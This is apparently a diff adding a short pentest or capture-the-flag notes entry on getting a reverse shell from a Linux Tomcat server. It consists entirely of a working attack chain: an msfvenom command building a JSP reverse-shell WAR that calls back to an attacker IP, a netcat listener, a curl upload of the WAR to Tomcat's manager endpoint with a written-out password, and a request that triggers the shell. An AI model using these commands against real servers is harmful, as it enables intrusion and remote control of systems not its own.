@@ -1,0 +1,7 @@
+Tomcat Deployed on Linux Reverse Shell:
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.120 LPORT=8080 -f war > rce.war
+nc -lvp 8080
+curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file rce.war 'http://example.com:8080/manager/text/deploy?path=/rce&update=true'
+curl http://example:8080/rce/tvrotpxexkpc.jsp
+```
